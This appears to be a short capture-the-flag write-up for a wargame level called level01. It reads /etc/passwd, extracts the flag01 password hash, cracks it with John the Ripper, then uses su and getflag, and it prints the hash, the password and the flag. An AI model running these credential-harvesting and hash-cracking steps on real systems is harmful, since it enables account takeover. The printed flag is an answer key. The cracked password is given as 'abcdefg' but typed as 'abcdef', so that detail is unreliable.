# level01

1. find that we have acces to /etc/passwd

```shell
cat /etc/passwd
```

2. retrieve flag01's password's hash

```shell
cat /etc/passwd | grep flag01 | cut -d ':' -f 2
```

Gives `42hDRfypTqqnw`

3. crack hash of flag01's password with john (from an external device)

```shell
echo "42hDRfypTqqnw" > hash
```

```shell
john hash
```

(using crypt(3)) gives: `abcdefg`

4. pwn the flag

```shell
su flag01
```

```shell
abcdef
```

```shell
getflag
```

gives flag: `f2av5il02puano7naaf6adaaf`
